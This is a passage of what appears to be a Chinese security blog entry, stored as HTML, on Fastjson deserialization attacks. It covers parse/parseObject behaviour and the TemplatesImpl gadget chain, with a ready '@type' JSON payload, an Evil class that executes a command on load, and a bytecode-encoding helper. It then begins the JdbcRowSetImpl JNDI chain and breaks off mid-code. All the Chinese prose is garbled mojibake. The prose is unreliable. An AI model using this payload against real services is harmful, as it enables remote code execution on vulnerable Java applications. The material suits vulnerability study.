    <content type="html"><![CDATA[<p>åˆ°äº†å–œé—»ä¹è§çš„Fastjsonã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Fastjson æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æº JSON è§£æåº“ï¼Œæ”¯æŒå°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ° JavaBeanã€‚é¡¾åæ€ä¹‰ï¼ŒFastJsonçš„ç‰¹ç‚¹å°±æ˜¯å¿«ã€‚</p><p>å…ˆä»æœ€ç®€å•çš„ç”¨æ³•è¯´èµ·å§ã€‚</p><h2 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h2><p>ä¾èµ–ç”¨çš„1.2.23</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="POJO-JSON"><a href="#POJO-JSON" class="headerlink" title="POJO &#x3D;&gt; JSON"></a>POJO &#x3D;&gt; JSON</h3><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.toJSONString()<br></code></pre></td></tr></table></figure><p>å‚æ•°è®¾ç½®ï¼š</p><ul><li><p>SerializerFeature.WriteClassName</p><p>åºåˆ—åŒ–æ—¶ï¼Œä¼šå¤šå‡ºä¸€ä¸ª<code>@type</code>è·Ÿä¸Šç±»å</p></li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> Integer age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, Integer age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Non-Arg Constructor&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I am &quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; and &quot;</span> + <span class="hljs-built_in">this</span>.age + <span class="hljs-string">&quot; years old&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><span class="hljs-keyword">import</span> org.example.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Tom&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> JSON.toJSONString((person1));<br>        System.out.println(str1);<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Lisa&quot;</span>, <span class="hljs-number">20</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(person2, SerializerFeature.WriteClassName);<br>        System.out.println(str2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>getAge</p><p>getName</p><p>{â€œageâ€:18,â€nameâ€:â€Tomâ€}</p><p>getAge</p><p>getName</p><p>{â€œ@typeâ€:â€org.example.Personâ€,â€ageâ€:20,â€nameâ€:â€Lisaâ€}</p></blockquote><h3 id="JSON-POJO"><a href="#JSON-POJO" class="headerlink" title="JSON &#x3D;&gt; POJO"></a>JSON &#x3D;&gt; POJO</h3><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.parseObject()<br></code></pre></td></tr></table></figure><p>å‚æ•°è®¾ç½®ï¼š</p><ul><li>Feature.SupportNonPublicField ååºåˆ—åŒ–æ—¶ï¼ŒåŠ ä¸Šè¯¥å‚æ•°æ‰èƒ½è¿˜åŸprivateå±æ€§</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> org.example.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Lisa\&quot;&#125;&quot;</span>, Person.class, Feature.SupportNonPublicField);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Non-Arg Constructor</p><p>setAge</p><p>setName</p><p>I am Lisa and 20 years old</p></blockquote><h3 id="parse-vs-parseObject"><a href="#parse-vs-parseObject" class="headerlink" title="parse vs parseObject"></a>parse vs parseObject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Lisa\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parse(s);<br>        System.out.println(obj1);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> JSON.parseObject(s);<br>        System.out.println(obj2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Non-Arg Constructor</p><p>setAge</p><p>setName</p><p>I am Lisa and 20 years old</p><p>Non-Arg Constructor</p><p>setAge</p><p>setName</p><p>getAge</p><p>getName</p><p>{â€œnameâ€:â€Lisaâ€,â€ageâ€:20}</p></blockquote><p>å¯ä»¥çœ‹åˆ°<code>JSON.parseObject()</code>çš„æ‰“å°ç»“æœå’Œæˆ‘ä»¬å®šä¹‰çš„<code>toString()</code>ä¸åŒï¼Œè¯´æ˜å®ƒä¸æ˜¯Personå¯¹è±¡ã€‚ï¼ˆå®é™…ä¸Šå¾—åˆ°çš„æ˜¯JSONObjectç±»å¯¹è±¡ï¼‰</p><p>ç»“è®ºï¼š</p><ul><li>parse()ä¼š<strong>è¯†åˆ«</strong>å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„setteræ–¹æ³•</li><li>parseObject()ä¼šè§¦å‘ç›®æ ‡ç±»çš„getterå’Œsetteræ–¹æ³•</li></ul><p><strong>å› æ­¤è‹¥èƒ½æ‰¾åˆ°ä¸€ä¸ªç±»ã€åœ¨ååºåˆ—åŒ–è¿™ä¸ªç±»å¯¹è±¡æ—¶ï¼Œfastjsonè°ƒç”¨å…¶setteræˆ–getteræ–¹æ³•ï¼Œä¸”setteræˆ–getteræ–¹æ³•å­˜åœ¨æ¼æ´ï¼Œå°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</strong></p><p>ä¸‹é¢å†åˆ—ä¸¾ä¸€äº›FastJsonçš„ç»“è®ºï¼Œåœ¨åç»­è°ƒè¯•ä¸­å¯ä»¥è§‚å¯Ÿå¾—åˆ°ï¼š</p><ul><li><code>JSON.parse(jsonString)</code> å’Œ <code>JSON.parseObject(jsonString, Target.class)</code>ï¼Œå‰è€…ä¼šåœ¨ jsonString ä¸­è§£æå­—ç¬¦ä¸²è·å– <code>@type</code> æŒ‡å®šçš„ç±»ï¼Œåè€…åˆ™ä¼šç›´æ¥ä½¿ç”¨å‚æ•°ä¸­çš„classã€‚</li><li><code>JSON.parseObject(jsonString)</code> å°†ä¼šè¿”å› JSONObject å¯¹è±¡ï¼Œä¸”ç±»ä¸­çš„æ‰€æœ‰ getter ä¸ setter éƒ½è¢«è°ƒç”¨ã€‚</li><li>å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨ <code>Feature.SupportNonPublicField</code> å‚æ•°ã€‚</li><li>fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœ Field ç±»å‹ä¸º <code>byte[]</code>ï¼Œå°†ä¼šè°ƒç”¨<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> è¿›è¡Œ base64 è§£ç ï¼Œå¯¹åº”çš„ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œ base64 ç¼–ç ã€‚</li><li>fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾ get&#x2F;set æ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•° <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> æ–¹æ³•ï¼Œä¼šå¿½ç•¥ <code>_ | -</code> å­—ç¬¦ä¸²ï¼Œå‡å¦‚å­—æ®µåå« <code>_a_g_e_</code>ï¼Œgetter æ–¹æ³•ä¸º <code>getAge()</code>ï¼Œfastjson ä¹Ÿå¯ä»¥æ‰¾å¾—åˆ°ã€‚</li></ul><p>é…ç½®ç±»ï¼š</p><p><code>com.alibaba.fastjson.parser.ParserConfig</code>ï¼šåé¢çš„AutoTypeå¼€å…³å’Œé»‘åå•ä½“ç°åœ¨è¿™ä¸ªç±»ä¸­</p><p>æ»¡è¶³æ¡ä»¶çš„setterï¼š</p><ul><li>å‡½æ•°åå¤§äºç­‰äº4</li><li>éé™æ€å‡½æ•°</li><li>ä»¥setå¼€å¤´ä¸”ç¬¬4ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»</li><li>å‚æ•°ä¸ªæ•°ä¸º1ä¸ª</li></ul><p>æ»¡è¶³æ¡ä»¶çš„getter</p><ul><li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4</li><li>éé™æ€æ–¹æ³•</li><li>ä»¥getå¼€å¤´ä¸”ç¬¬4ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>æ— å‚æ•°</li><li>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicInteger</li></ul><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>åœ¨å‰é¢çš„åŠ¨æ€å­—èŠ‚ç é‚£é‡Œæåˆ°è¿‡ï¼š</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»<br>    TransletClassLoader<br></code></pre></td></tr></table></figure><p>å­˜åœ¨ä½œç”¨åŸŸä¸º<code>default</code>çš„æ–¹æ³•<code>defineClass</code></p><p>æ‰¾åˆ°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><p>TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// TemplatesImpl#getOutputProperties()</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title function_">getOutputProperties</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> newTransformer().getOutputProperties();<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (TransformerConfigurationException e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// TemplatesImpl#newTransformer()</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span>&#123;<br>    TransformerImpl transformer;<br>    transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,<br>                                      _indentNumber, _tfactory);<br>&#125;<br><span class="hljs-comment">// TemplatesImpl#getTransletInstance()</span><br><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br>        <span class="hljs-comment">// ....</span><br>    &#125;<br>    <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br>        <span class="hljs-comment">// ...</span><br>&#125;<br><span class="hljs-comment">// TemplatesImpl#defineTransletClasses()</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//....</span><br>    <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span><br>        AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;TransletClassLoader&gt;() &#123;<br>            <span class="hljs-keyword">public</span> TransletClassLoader <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),<br>                                               _tfactory.getExternalExtensionsMap());<br>            &#125;<br>        &#125;);<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>        _class[i] = loader.defineClass(_bytecodes[i], pd);<br>        <span class="hljs-comment">// ....</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>defineTransletClasses</code>æ–¹æ³•ä¸­<code>_tfactory.getExternalExtensionsMap()</code> <code>_tfactory</code>æ˜¯<code>TransformerFactoryImpl</code>ç±» ä¸ºäº†ä¸æŠ›å‡ºå¼‚å¸¸éœ€è¦<code>_tfactory = new TransformerFactoryImpl()</code></li><li><code>getTransletInstance</code>æ–¹æ³•ä¸­åˆ¤æ–­<code>if (_name == null) return null;</code> æ‰€ä»¥è¦ç»™<code>_name</code>èµ‹å€¼ï¼ˆStringï¼‰</li></ul><p><code>TemplatesImpl</code> ä¸­å¯¹åŠ è½½çš„å­—èŠ‚ç æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼š</p><p>è¿™ä¸ªå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯**<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet </code>çš„å­ç±»ã€‚**</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getTransletInstance()é¦–å…ˆæ‰§è¡Œ defineTransletClasses()åŠ è½½ç±»åï¼Œè¿˜ä¼šå¯¹è¯¥ç±»è¿›è¡Œå®ä¾‹åŒ– (AbstractTranslet) _class[_transletIndex].newInstance();<br></code></pre></td></tr></table></figure><p>è€Œ<code>getOutputProperties()</code>æ­£æ˜¯<code>TemplatesImpl</code>çš„<code>_outputProperties</code>å±æ€§å¯¹åº”çš„getteræ–¹æ³•ã€‚</p><p>ç”±äºæ›´æ”¹çš„ä¸€äº›<code>TemplatesImpl</code>ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œéœ€è¦ä½¿ç”¨ <code>Feature.SupportNonPublicField</code> å‚æ•°ã€‚</p><h4 id="PayLoad"><a href="#PayLoad" class="headerlink" title="PayLoad"></a>PayLoad</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_bytecodes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;evilCode after Base64&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;taco&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_tfactory&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_outputProperties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>Evil.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·å–Base64ç¼–ç åçš„Evil.classå­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getPayLoad</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        System.out.println(Base64.getEncoder().encodeToString(code));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å±€é™"><a href="#å±€é™" class="headerlink" title="å±€é™"></a>å±€é™</h4><p>éœ€è¦ <code>Feature.SupportNonPublicField</code> å‚æ•°</p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>ä¸Šæ–‡çš„<code>TemplatesImpl</code>é“¾å­˜åœ¨ä¸¥é‡é™åˆ¶ï¼Œå³<code>JSON.parse()</code>éœ€è¦å¼€å¯<code>Feature.SupportNonPublicField</code></p><p><code>JdbcRowSetImpl</code>é“¾æ˜¯åŸºäº JNDI+RMI æˆ– JDNI+LADP è¿›è¡Œæ”»å‡»ï¼Œä¼šæœ‰ä¸€å®šçš„JDKç‰ˆæœ¬é™åˆ¶ã€‚</p><blockquote><p>RMIåˆ©ç”¨çš„JDKç‰ˆæœ¬â‰¤ JDK 6u132ã€7u122ã€8u113</p><p>LADPåˆ©ç”¨JDKç‰ˆæœ¬â‰¤ 6u211 ã€7u201ã€8u191</p></blockquote><p><code>com.sun.rowset.JdbcRowSetImpl</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAutoCommit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> var1)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-built_in">this</span>.conn.setAutoCommit(var1);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">this</span>.conn = <span class="hljs-built_in">this</span>.connect();<br><span class="hljs-built_in">this</span>.conn = 